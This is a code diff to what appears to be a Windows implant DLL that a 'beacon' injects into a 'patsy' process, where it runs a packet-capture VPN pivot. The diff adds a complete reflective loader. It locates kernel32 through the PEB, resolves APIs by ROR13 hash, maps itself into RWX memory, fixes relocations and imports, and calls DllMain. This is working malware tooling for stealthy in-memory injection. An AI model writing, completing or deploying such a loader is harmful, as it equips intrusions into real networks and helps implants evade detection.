@@ -29,6 +29,7 @@
 #include <wininet.h>
 #include <bcrypt.h>
 #include <tlhelp32.h>
+#include <intrin.h>
 #include <stdio.h>
 #include <string.h>
 
@@ -72,11 +73,11 @@
  *    72   useragent[64]
  *    136  key[16]
  *    152  bpf_len        u16 LE   (instruction count)
- *    160  bpf_blob[264]           interleaved insns, 8B each:
+ *    160  bpf_blob[256]           interleaved insns, 8B each:
  *                                 {u16 code, u8 jt, u8 jf, u32 k}
- *    424  adapter_hint[64]
- *    488  npcap_device[128]       \Device\NPF_{GUID} (advanced mode only)
- *    616  marker[32]
+ *    416  adapter_hint[64]
+ *    480  npcap_device[128]       \Device\NPF_{GUID} (advanced mode only)
+ *    608  marker[32]
  */
 #pragma pack(push, 1)
 typedef struct _VPN_CONFIG {
@@ -1139,6 +1140,235 @@ vpn_main_loop(LPVOID param)
     vpn_close_device(adapter_fd);
     return 0;
 }
+
+/* =================================================================
+ * REFLECTIVE LOADER — the beacon's COMMAND_SPAWN patches our DOS
+ * header into a stub that CALLS this export (at its file offset) with
+ * no arguments while the raw file image sits in an RWX allocation.
+ *
+ * Constraints honored here:
+ *   - fully position-independent: PEB-walks kernel32, resolves
+ *     LoadLibraryA/GetProcAddress/VirtualAlloc by ROR13 hash — the IAT
+ *     is NOT valid yet, so no imported call may run before resolution
+ *   - no CRT helpers (memcpy/memset): plain volatile byte loops, so
+ *     /O2 cannot rewrite them into calls into an unmapped import
+ *   - never dereferences its parameter (the DOS stub passes garbage)
+ *
+ * It maps a fresh image, applies relocations, resolves imports, then
+ * calls the real entrypoint (_DllMainCRTStartup for /MT), which runs
+ * CRT init and our DllMain -> VPN thread.
+ * ================================================================= */
+#if defined(_M_X64)
+
+typedef struct _RL_LIST_ENTRY {
+    struct _RL_LIST_ENTRY *Flink, *Blink;
+} RL_LIST_ENTRY;
+
+static DWORD
+rl_ror13_w(const wchar_t *s)
+{
+    DWORD h = 0;
+    while (*s) {
+        wchar_t c = *s;
+        if (c >= L'A' && c <= L'Z') c += 0x20;
+        h = _rotr(h, 13) + (DWORD)c;
+        s++;
+    }
+    return h;
+}
+
+static DWORD
+rl_ror13_a(const char *s)
+{
+    DWORD h = 0;
+    while (*s) {
+        char c = *s;
+        if (c >= 'A' && c <= 'Z') c += 0x20;
+        h = _rotr(h, 13) + (DWORD)(unsigned char)c;
+        s++;
+    }
+    return h;
+}
+
+/* Walk pages down from a code address until the PE header of the raw
+ * blob is found (the blob is page-aligned in the patsy). */
+static ULONG_PTR
+rl_self_base(void)
+{
+    volatile unsigned char *p = (volatile unsigned char *)((ULONG_PTR)_ReturnAddress() & ~0xFFFULL);
+    for (;;) {
+        if (p[0] == 'M' && p[1] == 'Z') {
+            LONG e = *(volatile LONG *)(p + 0x3C);
+            if (e > 0 && e < 0x400 &&
+                *(volatile ULONG *)(p + e) == 0x00004550UL) {
+                return (ULONG_PTR)p;
+            }
+        }
+        p -= 0x1000;
+    }
+}
+
+/* kernel32 base via the loader module list (x64 offsets) */
+static ULONG_PTR
+rl_kernel32(void)
+{
+    ULONG_PTR peb = (ULONG_PTR)__readgsqword(0x60);
+    RL_LIST_ENTRY *ldr = *(RL_LIST_ENTRY **)(peb + 0x18);
+    RL_LIST_ENTRY *head = (RL_LIST_ENTRY *)((BYTE *)ldr + 0x20);
+    DWORD want = rl_ror13_w(L"kernel32.dll");
+    RL_LIST_ENTRY *link;
+
+    for (link = head->Flink; link != head; link = link->Flink) {
+        const wchar_t *name = *(const wchar_t **)((BYTE *)link + 0x50);
+        if (name && rl_ror13_w(name) == want) {
+            return *(ULONG_PTR *)((BYTE *)link + 0x20);
+        }
+    }
+    return 0;
+}
+
+/* Resolve an export by ANSI-name hash from a module base */
+static ULONG_PTR
+rl_resolve(ULONG_PTR mod, DWORD want)
+{
+    LONG e = *(volatile LONG *)(mod + 0x3C);
+    IMAGE_NT_HEADERS *nth = (IMAGE_NT_HEADERS *)(mod + e);
+    IMAGE_DATA_DIRECTORY *dir = &nth->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];
+    if (dir->VirtualAddress == 0) return 0;
+
+    ULONG_PTR exp = mod + dir->VirtualAddress;
+    ULONG *names    = (ULONG *)(mod + ((IMAGE_EXPORT_DIRECTORY *)exp)->AddressOfNames);
+    USHORT *ords    = (USHORT *)(mod + ((IMAGE_EXPORT_DIRECTORY *)exp)->AddressOfNameOrdinals);
+    ULONG *funcs    = (ULONG *)(mod + ((IMAGE_EXPORT_DIRECTORY *)exp)->AddressOfFunctions);
+    ULONG i, n = ((IMAGE_EXPORT_DIRECTORY *)exp)->NumberOfNames;
+
+    for (i = 0; i < n; i++) {
+        if (rl_ror13_a((const char *)(mod + names[i])) == want) {
+            ULONG fr = funcs[ords[i]];
+            /* forwarded export (points inside the export dir) — bail */
+            if (fr >= dir->VirtualAddress &&
+                fr <  dir->VirtualAddress + dir->Size) return 0;
+            return mod + fr;
+        }
+    }
+    return 0;
+}
+
+__declspec(dllexport) ULONG_PTR WINAPI
+ReflectiveLoader(LPVOID param)
+{
+    typedef HMODULE (WINAPI *RL_LLA)(LPCSTR);
+    typedef FARPROC (WINAPI *RL_GPA)(HMODULE, LPCSTR);
+    typedef LPVOID  (WINAPI *RL_VA)(LPVOID, SIZE_T, DWORD, DWORD);
+
+    ULONG_PTR base, k32, newbase, delta;
+    IMAGE_DOS_HEADER *dh;
+    IMAGE_NT_HEADERS *nth;
+    IMAGE_SECTION_HEADER *sec;
+    RL_LLA pLLA; RL_GPA pGPA; RL_VA pVA;
+    WORD s;
+    DWORD tag;
+    DWORD hLLA, hGPA, hVA;
+    ULONG_PTR entry;
+    IMAGE_DATA_DIRECTORY *dir;
+
+    (void)param;   /* the DOS-header stub passes garbage in rcx */
+
+    base = rl_self_base();
+    if (!base) return 0;
+    dh  = (IMAGE_DOS_HEADER *)base;
+    nth = (IMAGE_NT_HEADERS *)(base + dh->e_lfanew);
+
+    k32 = rl_kernel32();
+    if (!k32) return 0;
+
+    hLLA = rl_ror13_a("LoadLibraryA");
+    hGPA = rl_ror13_a("GetProcAddress");
+    hVA  = rl_ror13_a("VirtualAlloc");
+    pLLA = (RL_LLA)rl_resolve(k32, hLLA);
+    pGPA = (RL_GPA)rl_resolve(k32, hGPA);
+    pVA  = (RL_VA)rl_resolve(k32, hVA);
+    if (!pLLA || !pGPA || !pVA) return 0;
+
+    newbase = (ULONG_PTR)pVA(NULL, nth->OptionalHeader.SizeOfImage,
+                             MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
+    if (!newbase) return 0;
+
+    /* copy headers */
+    {
+        volatile unsigned char *d = (volatile unsigned char *)newbase;
+        volatile unsigned char *s = (volatile unsigned char *)base;
+        DWORD n = nth->OptionalHeader.SizeOfHeaders, i;
+        for (i = 0; i < n; i++) d[i] = s[i];
+    }
+
+    /* copy sections */
+    sec = (IMAGE_SECTION_HEADER *)((BYTE *)&nth->OptionalHeader +
+                                   nth->FileHeader.SizeOfOptionalHeader);
+    for (s = 0; s < nth->FileHeader.NumberOfSections; s++) {
+        if (sec[s].SizeOfRawData) {
+            volatile unsigned char *d = (volatile unsigned char *)(newbase + sec[s].VirtualAddress);
+            volatile unsigned char *p = (volatile unsigned char *)(base + sec[s].PointerToRawData);
+            DWORD i, n = sec[s].SizeOfRawData;
+            for (i = 0; i < n; i++) d[i] = p[i];
+        }
+    }
+
+    /* relocations */
+    delta = newbase - nth->OptionalHeader.ImageBase;
+    dir = nth->OptionalHeader.DataDirectory;
+    if (delta && dir[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress) {
+        volatile unsigned char *reloc = (volatile unsigned char *)(newbase +
+            dir[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress);
+        DWORD total = dir[IMAGE_DIRECTORY_ENTRY_BASERELOC].Size;
+        DWORD off = 0;
+        while (off < total) {
+            DWORD page = *(volatile DWORD *)(reloc + off);
+            DWORD bsize = *(volatile DWORD *)(reloc + off + 4);
+            DWORD e;
+            if (bsize < 8) break;
+            for (e = 8; e < bsize; e += 2) {
+                tag = *(volatile WORD *)(reloc + off + e);
+                if ((tag >> 12) == 10) {   /* IMAGE_REL_BASED_DIR64 */
+                    ULONG_PTR *fix = (ULONG_PTR *)(newbase + page + (tag & 0xFFF));
+                    *fix += delta;
+                }
+            }
+            off += bsize;
+        }
+    }
+
+    /* imports */
+    if (dir[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress) {
+        IMAGE_IMPORT_DESCRIPTOR *imp = (IMAGE_IMPORT_DESCRIPTOR *)(newbase +
+            dir[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress);
+        for (; imp->Name; imp++) {
+            HMODULE mod = pLLA((LPCSTR)(newbase + imp->Name));
+            ULONG_PTR thunk_rva = imp->OriginalFirstThunk ? imp->OriginalFirstThunk
+                                                          : imp->FirstThunk;
+            ULONGLONG *ot = (ULONGLONG *)(newbase + thunk_rva);
+            ULONGLONG *ft = (ULONGLONG *)(newbase + imp->FirstThunk);
+            for (; *ot; ot++, ft++) {
+                if (*ot & 0x8000000000000000ULL) {
+                    *ft = (ULONGLONG)pGPA(mod, (LPCSTR)(*ot & 0xFFFF));
+                } else {
+                    *ft = (ULONGLONG)pGPA(mod, (LPCSTR)(newbase + (DWORD)*ot + 2));
+                }
+            }
+        }
+    }
+
+    /* exception directory (RtlAddFunctionTable equivalent is optional;
+     * /MT DLLs work without it under SEH-less flows like ours) */
+
+    entry = newbase + nth->OptionalHeader.AddressOfEntryPoint;
+    ((BOOL (WINAPI *)(HINSTANCE, DWORD, LPVOID))entry)(
+        (HINSTANCE)newbase, DLL_PROCESS_ATTACH, NULL);
+
+    return newbase;
+}
+
+#endif /* _M_X64 */
 
 /* =================================================================
  * DLL ENTRY — beacon injects via COMMAND_SPAWN(1)
